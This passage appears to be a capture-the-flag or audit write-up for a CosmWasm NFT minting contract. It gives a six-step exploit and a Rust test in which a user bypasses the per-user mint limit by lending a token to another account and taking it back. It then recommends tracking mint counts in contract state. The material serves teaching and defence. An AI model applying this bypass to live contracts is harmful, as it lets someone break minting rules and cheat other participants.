1. Ensure `USER1` is whitelisted, and `mint_per_user` is set to 3.
2. Mint the maximally allowed 3 tokens to `USER1`
3. `USER1` temporarily transfers a token to `USER3`
4. `USER1` successfully mints another token
5. `USER3` transfers the token back to `USER1`
6. Ensure that `USER1` now has 4 tokens, i.e., has bypassed the `mint_per_user` restriction.

```rust
#[test]
fn exploit_flow() {
    let (mut app, contract_addr) = proper_instantiate();

    // 1. Query config; ensure USER1 is whitelisted, mint_per_user is 3
    let config: Config = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
        .unwrap();

    // query whitelisted users
    let whitelist: Whitelist = app
        .wrap()
        .query_wasm_smart(contract_addr.clone(), &QueryMsg::Whitelist {})
        .unwrap();

    assert!(whitelist.users.contains(&USER1.to_owned()));
    assert!(whitelist.users.contains(&USER2.to_owned()));
    assert!(whitelist.users.contains(&USER3.to_owned()));
    assert_eq!(config.mint_per_user, 3);

    // 2. Mint to USER1 until max limit
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr.clone(),
        &ExecuteMsg::Mint {},
        &[],
    )
    .unwrap();
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr.clone(),
        &ExecuteMsg::Mint {},
        &[],
    )
    .unwrap();
    let result = 
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr.clone(),
        &ExecuteMsg::Mint {},
        &[],
    )
    .unwrap();
    assert_eq!(result.events[1].attributes[3], attr("token_id", "2"));

    // 3. Transfer token to USER3
    app.execute_contract(
        Addr::unchecked(USER1),
        config.nft_contract.clone(),
        &Cw721ExecuteMsg::TransferNft {
            recipient: USER3.to_string(),
            token_id: "2".to_string(),
        },
        &[],
    )
    .unwrap();

    // 4. USER1 can mint another token
    app.execute_contract(
        Addr::unchecked(USER1),
        contract_addr.clone(),
        &ExecuteMsg::Mint {},
        &[],
    )
    .unwrap();

    // 5. Transfer token back to USER1
    app.execute_contract(
        Addr::unchecked(USER3),
        config.nft_contract.clone(),
        &Cw721ExecuteMsg::TransferNft {
            recipient: USER1.to_string(),
            token_id: "2".to_string(),
        },
        &[],
    )
    .unwrap();

    // 6. USER 1 has 4 tokens, i.e. has bypassed the `mint_per_user` restriction
    let tokens_response: TokensResponse = app.wrap().query_wasm_smart(
        config.nft_contract.to_string(),
        &Cw721QueryMsg::Tokens {
            owner: USER1.to_string(),
            start_after: None,
            limit: None,
        },
    ).unwrap();
    assert_eq!(tokens_response.tokens.len(), 4);
}
```

### Recommendation

For bookkeeping of important state components (such as the `mint_per_user` restriction), we recommend not to rely on external contracts, which are not entirely under the control of the contract in question. For this specific contract, we recommend to introduce another, per-user state variable that keeps track of how many tokens the user has minted already, and replace [the corresponding logic in mint()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-10/src/contract.rs#L95-L107) with reading and updating this per-user state variable. Specifically, this could be done as follows (updating the imports as necessary):

- Add the following after [state.rs:23](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-10/src/state.rs#L23)

    ```rust
    pub const MINTS: Map<String, Uint128> = Map::new("mints");
    ```

- Replace [this query and check logic in mint()](https://github.com/oak-security/cosmwasm-ctf/blob/a92a17756ac57964881edfd35afb8c0369424ba6/ctf-10/src/contract.rs#L95-L107) with

    ```rust
    let mints = MINTS.load(deps.storage, info.sender.to_string()).unwrap_or(Uint128::zero());

    // ensure mint per user limit is not exceeded
    if mints >= Uint128::new(config.mint_per_user as u128) {
        return Err(ContractError::MaxLimitExceeded {});
    }
    // increments mints per user
    MINTS.save(deps.storage, info.sender.to_string(), &(mints + Uint128::one()))?;
    ```

---
